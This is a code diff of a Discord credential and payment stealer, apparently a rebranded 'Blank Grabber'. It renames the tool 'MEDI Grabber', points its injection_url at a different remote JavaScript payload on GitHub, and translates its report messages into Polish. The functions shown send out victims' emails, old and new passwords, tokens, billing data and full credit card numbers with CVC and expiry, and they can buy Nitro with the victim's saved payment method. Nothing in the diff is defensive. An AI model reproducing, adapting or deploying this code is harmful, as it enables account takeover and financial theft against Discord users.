@@ -16,10 +16,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber', 
+  embed_name: 'MEDI Grabber', 
   embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/lol/main/lololololol.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -539,7 +539,7 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
+  const failedMsg = 'Kupienie Zakończone Niepowodzeniem ❌';
   if (!data) return failedMsg;
 
   let IDS = [];
@@ -571,13 +571,13 @@ const buyNitro = async (token) => {
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return 'Bez Nitro';
     case 1:
       return 'Nitro Classic';
     case 2:
       return 'Nitro Boost';
     default:
-      return 'No Nitro';
+      return 'Bez Nitro';
   }
 };
 
@@ -667,13 +667,13 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Acc Info**',
+            value: `Email: **${email}** - Hasło: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
             inline: false,
           },
           {
@@ -706,13 +706,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            name: '**Hasło Zmienione**',
+            value: `Email: **${json.email}**\nStare Hasło: **${oldpassword}**\nNowe Hasło: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
             inline: true,
           },
           {
@@ -745,13 +745,13 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            name: '**Email Zmieniony**',
+            value: `Nowy Email: **${email}**\nHasłp: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
             inline: true,
           },
           {
@@ -784,13 +784,13 @@ const PaypalAdded = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            name: '**Paypal Dodany**',
+            value: `Czas Kupić Nitro 😩`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}*\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
             inline: false,
           },
           {
@@ -823,13 +823,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**Karta Bankowa Dodana**',
+            value: `Numer Karty Bankowej: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaka: **${badges}**\nPłatności: **${billing}**`,
             inline: true,
           },
           {
@@ -864,13 +864,13 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
+            name: '**Nitro kupione!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Rodzaj Nitro: **${nitro}**\nOdznaki: **${badges}**\nPłatności: **${billing}**`,
             inline: true,
           },
           {
